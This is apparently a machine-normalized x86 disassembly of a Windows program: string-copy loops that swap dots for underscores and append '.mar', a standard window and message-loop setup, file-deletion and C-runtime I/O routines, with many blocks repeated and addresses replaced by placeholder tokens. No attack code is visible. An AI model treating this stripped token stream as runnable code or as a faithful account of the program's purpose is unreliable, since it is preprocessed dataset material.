mov al [ ecx ]
mov [ edx ] al
inc ecx
inc edx
test al al
jne r-xdata
push 0xff
lea eax [ ebp - 0x104 ]
push 0x0
push eax
call sub_40c890
mov eax [ ebx + edi * 4 + 0x4 ]
lea edx [ ebp - 0x104 ]
add esp 0xc
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov bl 0x2e
xor esi esi
cmp [ ebp - 0x104 ] bl
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov bl 0x2e
xor esi esi
cmp [ ebp - 0x104 ] bl
je r-xdata
xor ecx ecx
cmp [ rwxdata ] bl
je r-xdata
inc esi
cmp [ ebp + esi - 0x104 ] bl
jne r-xdata
xor ecx ecx
cmp [ rwxdata ] bl
je r-xdata
jmp r-xdata
inc esi
mov [ ebp + esi - 0x105 ] 0x5f
add ecx esi
mov eax esi
cmp esi ecx
jge r-xdata
lea ebx [ ebx ]
inc esi
mov [ ebp + esi - 0x105 ] 0x5f
add ecx esi
mov eax esi
cmp esi ecx
jge r-xdata
inc ecx
cmp [ ecx + rwxdata ] bl
jne r-xdata
inc esi
cmp [ ebp + esi - 0x104 ] bl
jne r-xdata
mov [ ebp + eax - 0x104 ] bl
mov [ ebp + eax - 0x103 ] 0x616d
mov [ ebp + eax - 0x101 ] 0x72
lea eax [ ebp - 0x104 ]
lea edx [ eax + 0x1 ]
nop
sub ecx esi
mov edi ecx
push edi
lea eax [ ebp + esi - 0x104 ]
push rwxdata
push eax
call sub_4090d0
lea eax [ edi + esi ]
mov edi [ ebp - 0x108 ]
add esp 0xc
inc ecx
cmp [ ecx + rwxdata ] bl
jne r-xdata
mov [ ebp + eax - 0x104 ] bl
mov [ ebp + eax - 0x103 ] 0x616d
mov [ ebp + eax - 0x101 ] 0x72
lea eax [ ebp - 0x104 ]
lea edx [ eax + 0x1 ]
sub ecx esi
mov edi ecx
push edi
lea eax [ ebp + esi - 0x104 ]
push rwxdata
push eax
call sub_4090d0
lea eax [ edi + esi ]
mov edi [ ebp - 0x108 ]
add esp 0xc
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
push 0xff
lea edx [ ebp - 0x104 ]
push 0x0
push edx
call sub_40c890
mov eax [ ebp - 0x10c ]
mov eax [ eax + edi * 4 + 0x4 ]
lea edx [ ebp - 0x104 ]
add esp 0xc
sub edx eax
push eax
lea ecx [ ebp - 0x104 ]
push ecx
push rwxdata
call sub_4090d0
add esp 0xc
push 0xff
lea edx [ ebp - 0x104 ]
push 0x0
push edx
call sub_40c890
mov eax [ ebp - 0x10c ]
mov eax [ eax + edi * 4 + 0x4 ]
lea edx [ ebp - 0x104 ]
add esp 0xc
sub edx eax
jmp r-xdata
push eax
lea ecx [ ebp - 0x104 ]
push ecx
push rwxdata
call sub_4090d0
add esp 0xc
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
xor esi esi
cmp [ ebp - 0x104 ] bl
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
xor ecx ecx
cmp [ rwxdata ] bl
je r-xdata
lea esp [ esp ]
xor esi esi
cmp [ ebp - 0x104 ] bl
je r-xdata
inc esi
mov [ ebp + esi - 0x105 ] 0x5f
add ecx esi
mov eax esi
cmp esi ecx
jge r-xdata
inc ecx
cmp [ ecx + rwxdata ] bl
jne r-xdata
inc esi
cmp [ ebp + esi - 0x104 ] bl
jne r-xdata
xor ecx ecx
cmp [ rwxdata ] bl
je r-xdata
inc esi
cmp [ ebp + esi - 0x104 ] bl
jne r-xdata
mov [ ebp + eax - 0x104 ] bl
mov [ ebp + eax - 0x103 ] 0x616d
mov [ ebp + eax - 0x101 ] 0x72
lea eax [ ebp - 0x104 ]
lea edx [ eax + 0x1 ]
sub ecx esi
mov edi ecx
push edi
lea eax [ ebp + esi - 0x104 ]
push rwxdata
push eax
call sub_4090d0
lea eax [ edi + esi ]
mov edi [ ebp - 0x108 ]
add esp 0xc
inc esi
mov [ ebp + esi - 0x105 ] 0x5f
add ecx esi
mov eax esi
cmp esi ecx
jge r-xdata
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov [ ebp + eax - 0x104 ] bl
mov [ ebp + eax - 0x103 ] 0x616d
mov [ ebp + eax - 0x101 ] 0x72
lea eax [ ebp - 0x104 ]
lea edx [ eax + 0x1 ]
nop
sub ecx esi
mov edi ecx
push edi
lea eax [ ebp + esi - 0x104 ]
push rwxdata
push eax
call sub_4090d0
lea eax [ edi + esi ]
mov edi [ ebp - 0x108 ]
add esp 0xc
inc ecx
cmp [ ecx + rwxdata ] bl
jne r-xdata
push 0xff
lea edx [ ebp - 0x104 ]
push 0x0
push edx
call sub_40c890
mov eax [ ebp - 0x10c ]
mov eax [ eax + edi * 4 + 0x4 ]
lea edx [ ebp - 0x104 ]
add esp 0xc
sub edx eax
jmp r-xdata
push eax
lea ecx [ ebp - 0x104 ]
push ecx
push rwxdata
call sub_4090d0
add esp 0xc
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
push 0xff
lea edx [ ebp - 0x104 ]
push 0x0
push edx
call sub_40c890
mov eax [ ebp - 0x10c ]
mov eax [ eax + edi * 4 + 0x4 ]
lea edx [ ebp - 0x104 ]
add esp 0xc
sub edx eax
push eax
lea ecx [ ebp - 0x104 ]
push ecx
push rwxdata
call sub_4090d0
add esp 0xc
xor esi esi
cmp [ ebp - 0x104 ] bl
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
xor esi esi
cmp [ ebp - 0x104 ] bl
je r-xdata
xor ecx ecx
cmp [ rwxdata ] bl
je r-xdata
inc esi
cmp [ ebp + esi - 0x104 ] bl
jne r-xdata
xor ecx ecx
cmp [ rwxdata ] bl
je r-xdata
lea esp [ esp ]
inc esi
mov [ ebp + esi - 0x105 ] 0x5f
add ecx esi
mov eax esi
cmp esi ecx
jge r-xdata
jmp r-xdata
inc esi
mov [ ebp + esi - 0x105 ] 0x5f
add ecx esi
mov eax esi
cmp esi ecx
jge r-xdata
inc ecx
cmp [ ecx + rwxdata ] bl
jne r-xdata
inc esi
cmp [ ebp + esi - 0x104 ] bl
jne r-xdata
mov [ ebp + eax - 0x104 ] bl
mov [ ebp + eax - 0x103 ] 0x616d
mov [ ebp + eax - 0x101 ] 0x72
lea eax [ ebp - 0x104 ]
lea edx [ eax + 0x1 ]
nop
sub ecx esi
mov edi ecx
push edi
lea eax [ ebp + esi - 0x104 ]
push rwxdata
push eax
call sub_4090d0
lea eax [ edi + esi ]
mov edi [ ebp - 0x108 ]
add esp 0xc
inc ecx
cmp [ ecx + rwxdata ] bl
jne r-xdata
mov [ ebp + eax - 0x104 ] bl
mov [ ebp + eax - 0x103 ] 0x616d
mov [ ebp + eax - 0x101 ] 0x72
lea eax [ ebp - 0x104 ]
lea edx [ eax + 0x1 ]
sub ecx esi
mov edi ecx
push edi
lea eax [ ebp + esi - 0x104 ]
push rwxdata
push eax
call sub_4090d0
lea eax [ edi + esi ]
mov edi [ ebp - 0x108 ]
add esp 0xc
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
push 0xff
lea edx [ ebp - 0x104 ]
push 0x0
push edx
call sub_40c890
mov eax [ ebp - 0x10c ]
mov eax [ eax + edi * 4 + 0x4 ]
lea edx [ ebp - 0x104 ]
add esp 0xc
sub edx eax
push eax
lea ecx [ ebp - 0x104 ]
push ecx
push rwxdata
call sub_4090d0
add esp 0xc
push 0xff
lea edx [ ebp - 0x104 ]
push 0x0
push edx
call sub_40c890
mov eax [ ebp - 0x10c ]
mov eax [ eax + edi * 4 + 0x4 ]
lea edx [ ebp - 0x104 ]
add esp 0xc
sub edx eax
jmp r-xdata
push eax
lea ecx [ ebp - 0x104 ]
push ecx
push rwxdata
call sub_4090d0
add esp 0xc
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
xor esi esi
cmp [ ebp - 0x104 ] bl
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
xor ecx ecx
cmp [ rwxdata ] bl
je r-xdata
lea esp [ esp ]
xor esi esi
cmp [ ebp - 0x104 ] bl
je r-xdata
inc esi
mov [ ebp + esi - 0x105 ] 0x5f
add ecx esi
mov eax esi
cmp esi ecx
jge r-xdata
inc ecx
cmp [ ecx + rwxdata ] bl
jne r-xdata
inc esi
cmp [ ebp + esi - 0x104 ] bl
jne r-xdata
xor ecx ecx
cmp [ rwxdata ] bl
je r-xdata
inc esi
cmp [ ebp + esi - 0x104 ] bl
jne r-xdata
mov [ ebp + eax - 0x104 ] bl
mov [ ebp + eax - 0x103 ] 0x616d
mov [ ebp + eax - 0x101 ] 0x72
lea eax [ ebp - 0x104 ]
lea edx [ eax + 0x1 ]
sub ecx esi
mov edi ecx
push edi
lea eax [ ebp + esi - 0x104 ]
push rwxdata
push eax
call sub_4090d0
lea eax [ edi + esi ]
mov edi [ ebp - 0x108 ]
add esp 0xc
inc esi
mov [ ebp + esi - 0x105 ] 0x5f
add ecx esi
mov eax esi
cmp esi ecx
jge r-xdata
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov [ ebp + eax - 0x104 ] bl
mov [ ebp + eax - 0x103 ] 0x616d
mov [ ebp + eax - 0x101 ] 0x72
lea eax [ ebp - 0x104 ]
lea edx [ eax + 0x1 ]
nop
sub ecx esi
mov edi ecx
push edi
lea eax [ ebp + esi - 0x104 ]
push rwxdata
push eax
call sub_4090d0
lea eax [ edi + esi ]
mov edi [ ebp - 0x108 ]
add esp 0xc
inc ecx
cmp [ ecx + rwxdata ] bl
jne r-xdata
push 0xff
lea edx [ ebp - 0x104 ]
push 0x0
push edx
call sub_40c890
mov eax [ ebp - 0x10c ]
mov eax [ eax + edi * 4 + 0x4 ]
lea edx [ ebp - 0x104 ]
add esp 0xc
sub edx eax
jmp r-xdata
push eax
lea ecx [ ebp - 0x104 ]
push ecx
push rwxdata
call sub_4090d0
add esp 0xc
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
push 0xff
lea edx [ ebp - 0x104 ]
push 0x0
push edx
call sub_40c890
mov eax [ ebp - 0x10c ]
mov eax [ eax + edi * 4 + 0x4 ]
lea edx [ ebp - 0x104 ]
add esp 0xc
sub edx eax
push eax
lea ecx [ ebp - 0x104 ]
push ecx
push rwxdata
call sub_4090d0
add esp 0xc
xor esi esi
cmp [ ebp - 0x104 ] bl
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
xor esi esi
cmp [ ebp - 0x104 ] bl
je r-xdata
xor ecx ecx
cmp [ rwxdata ] bl
je r-xdata
inc esi
cmp [ ebp + esi - 0x104 ] bl
jne r-xdata
xor ecx ecx
cmp [ rwxdata ] bl
je r-xdata
lea esp [ esp ]
inc esi
mov [ ebp + esi - 0x105 ] 0x5f
add ecx esi
mov eax esi
cmp esi ecx
jge r-xdata
jmp r-xdata
inc esi
mov [ ebp + esi - 0x105 ] 0x5f
add ecx esi
mov eax esi
cmp esi ecx
jge r-xdata
inc ecx
cmp [ ecx + rwxdata ] bl
jne r-xdata
inc esi
cmp [ ebp + esi - 0x104 ] bl
jne r-xdata
mov [ ebp + eax - 0x104 ] bl
mov [ ebp + eax - 0x103 ] 0x616d
mov [ ebp + eax - 0x101 ] 0x72
lea eax [ ebp - 0x104 ]
lea edx [ eax + 0x1 ]
lea esp [ esp ]
sub ecx esi
mov edi ecx
push edi
lea eax [ ebp + esi - 0x104 ]
push rwxdata
push eax
call sub_4090d0
add esp 0xc
lea eax [ edi + esi ]
inc ecx
cmp [ ecx + rwxdata ] bl
jne r-xdata
mov [ ebp + eax - 0x104 ] bl
mov [ ebp + eax - 0x103 ] 0x616d
mov [ ebp + eax - 0x101 ] 0x72
lea eax [ ebp - 0x104 ]
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
sub ecx esi
mov edi ecx
push edi
lea eax [ ebp + esi - 0x104 ]
push rwxdata
push eax
call sub_4090d0
add esp 0xc
lea eax [ edi + esi ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
call sub_403280
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_405894
mov esp ebp
pop ebp
retn
push eax
lea ecx [ ebp - 0x104 ]
push ecx
push rwxdata
call sub_4090d0
add esp 0xc
call sub_4046f0
push eax
lea ecx [ ebp - 0x104 ]
push ecx
push rwxdata
call sub_4090d0
add esp 0xc
sub_405550
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
push eax
lea eax [ rwxdata ]
mov [ eax ] esp
add [ eax ] 0x4
lea eax [ rwxdata ]
mov [ eax ] ecx
lea eax [ rwxdata ]
mov [ eax ] edx
lea eax [ rwxdata ]
mov [ eax ] ebp
lea esi [ rwxdata ]
mov [ eax ] esi
lea edi [ rwxdata ]
mov [ eax ] edi
mov esi [ ebp + 0x8 ]
mov edi [ LoadStringA@IAT ]
push 0x64
push rwxdata
push 0x67
push esi
call edi
push 0x64
push rwxdata
push 0x6d
push esi
call edi
mov eax esi
call sub_405630
mov [ rwxdata ] esi
call sub_404b40
push 0x6d
push esi
call [ LoadAcceleratorsA@IAT ]
mov edi [ GetMessageA@IAT ]
push 0x0
push 0x0
mov esi eax
push 0x0
lea eax [ ebp - 0x1c ]
push eax
call edi
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ebx [ TranslateAcceleratorA@IAT ]
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x1c ]
push edx
call edi
test eax eax
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
call [ TranslateMessage@IAT ]
lea ecx [ ebp - 0x1c ]
push ecx
call [ DispatchMessageA@IAT ]
mov edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x1c ]
push ecx
push esi
push edx
call ebx
test eax eax
jne r-xdata
sub_405630
push ebp
mov ebp esp
sub esp 0x30
push esi
mov esi [ LoadIconA@IAT ]
push 0x6b
push eax
mov [ ebp - 0x30 ] 0x30
mov [ ebp - 0x2c ] 0x3
mov [ ebp - 0x28 ] sub_4056c0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] eax
call esi
push 0x7f00
push 0x0
mov [ ebp - 0x18 ] eax
call [ LoadCursorA@IAT ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x1c ]
push 0x6c
push eax
mov [ ebp - 0x10 ] 0x6
mov [ ebp - 0xc ] 0x6d
mov [ ebp - 0x8 ] rwxdata
call esi
lea ecx [ ebp - 0x30 ]
push ecx
mov [ ebp - 0x4 ] eax
call [ RegisterClassExA@IAT ]
pop esi
mov esp ebp
pop ebp
retn
sub_4056c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x4c
mov eax [ rwxdata ]
xor eax esp
mov [ esp + 0x48 ] eax
mov ecx [ ebp + 0xc ]
mov eax ecx
sub eax 0x2
push esi
mov esi [ ebp + 0x8 ]
je r-xdata
push 0x0
call [ PostQuitMessage@IAT ]
mov ecx [ esp + 0x4c ]
pop esi
xor ecx esp
xor eax eax
call sub_405894
mov esp ebp
pop ebp
retn 0x10
sub eax 0xd
je r-xdata
lea edx [ esp + 0x8 ]
push edx
push esi
call [ BeginPaint@IAT ]
lea eax [ esp + 0x8 ]
push eax
push esi
call [ EndPaint@IAT ]
xor eax eax
pop esi
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_405894
mov esp ebp
pop ebp
retn 0x10
sub eax 0x102
je r-xdata
mov ecx [ ebp + 0x10 ]
movzx eax cx
sub eax 0x68
je r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push eax
push edx
push ecx
push esi
call [ DefWindowProcA@IAT ]
pop esi
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_405894
mov esp ebp
pop ebp
retn 0x10
mov ecx [ rwxdata ]
push 0x0
push sub_4057e0
push esi
push 0x67
push ecx
call [ DialogBoxParamA@IAT ]
xor eax eax
pop esi
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_405894
mov esp ebp
pop ebp
retn 0x10
dec eax
je r-xdata
push esi
call [ DestroyWindow@IAT ]
xor eax eax
pop esi
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_405894
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
push eax
push ecx
push 0x111
push esi
call [ DefWindowProcA@IAT ]
pop esi
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_405894
mov esp ebp
pop ebp
retn 0x10
sub_4057e0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub eax 0x110
je r-xdata
mov eax 0x1
pop ebp
retn 0x10
dec eax
jne r-xdata
xor eax eax
pop ebp
retn 0x10
mov eax [ ebp + 0x10 ]
cmp ax 0x1
je r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax ax
push eax
push ecx
call [ EndDialog@IAT ]
cmp ax 0x2
je r-xdata
sub_4058a3
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
push eax
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_406a9f
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop edi
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_40679c
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_405943
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407c0c
add esp 0x14
pop ebp
retn
sub_405961
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x18 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407c0c
add esp 0x14
pop ebp
retn
sub_405980
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x18 ]
push eax
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407ca0
add esp 0x18
pop ebp
retn
sub_4059a1
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x1c ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407ca0
add esp 0x18
pop ebp
retn
sub_4059c3
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407dd5
add esp 0x14
pop ebp
retn
sub_4059e1
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x18 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407dd5
add esp 0x14
pop ebp
retn
sub_405a5c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x10
pop ebp
retn
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
xor eax eax
pop ebp
retn
sub_405a84
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x20
pop ebp
retn
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
xor eax eax
pop ebp
retn
sub_405aac
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteFileA@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn
push eax
call sub_4078d4
pop ecx
or eax 0xffffffff
pop ebp
retn
test eax eax
je r-xdata
sub_405ae7
push 0xc
push r--data
call sub_408380
xor ebx ebx
mov [ ebp - 0x1c ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
xor eax eax
mov esi [ ebp + 0xc ]
cmp esi ebx
setne al
cmp eax ebx
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
xor eax eax
cmp [ esi ] bl
setne al
cmp eax ebx
je r-xdata
call sub_4083c5
retn
call sub_40824b
mov [ ebp + 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi ] bl
jne r-xdata
call sub_4078ae
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push esi
push edi
call sub_407fb4
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405b99
mov eax [ ebp - 0x1c ]
call sub_4078ae
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rwxdata
call sub_4085a0
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_405bba
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_405ae7
add esp 0xc
mov [ esi ] eax
test eax eax
je r-xdata
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
call sub_407823
mov eax esi
jmp r-xdata
call sub_4078ae
mov eax [ eax ]
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_405c01
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
xor edx edx
div edi
cmp [ ebp + 0x10 ] eax
ja r-xdata
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_40679c
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
js r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_408ee9
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_408ec3
pop ecx
push eax
call sub_408def
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_4090d0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_405d58
push 0xc
push r--data
call sub_408380
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_407ed6
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405c01
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405dc8
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
call sub_4083c5
retn
sub_405dd2
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push esi
push edi
call sub_408ec3
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
cmp [ edi + 0x4 ] ebx
jge r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
jmp r-xdata
push 0x1
push ebx
push esi
call sub_40973e
add esp 0xc
mov [ ebp - 0x4 ] eax
cmp eax ebx
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
pop esi
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
mov ebx eax
sub ebx ecx
mov [ ebp - 0xc ] ebx
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx esi
sar edx 0x5
mov edx [ edx * 4 + rwxdata ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax ebx
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x4 ]
mov edx [ edi + 0x4 ]
test edx edx
jne r-xdata
inc edx
cmp edx esi
jb r-xdata
inc ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0x8 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rwxdata ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
and [ ebp - 0xc ] edx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov [ ebp - 0xc ] ebx
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x4 ] eax
push 0x2
push 0x0
push [ ebp - 0x8 ]
call sub_40973e
add esp 0xc
cmp eax [ ebp - 0x4 ]
jne r-xdata
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_40973e
add esp 0xc
test eax eax
jns r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_405f66
push 0xc
push r--data
call sub_408380
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_407ed6
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_405dd2
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405fc1
